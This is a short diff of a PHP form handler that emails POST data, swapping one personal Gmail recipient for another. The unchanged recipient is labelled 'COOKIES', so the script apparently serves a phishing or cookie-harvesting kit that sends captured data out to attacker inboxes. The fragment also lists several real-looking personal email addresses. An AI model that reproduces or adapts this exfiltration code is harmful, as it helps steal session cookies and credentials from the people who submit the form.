@@ -35,7 +35,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email properties
         $mail->addAddress('rutherfordhenress@gmail.com', 'COOKIES');
-        $mail->addAddress('approval.ads.monica.ramey@gmail.com');
+        $mail->addAddress('subhannizamani51@gmail.com');
        
 
 
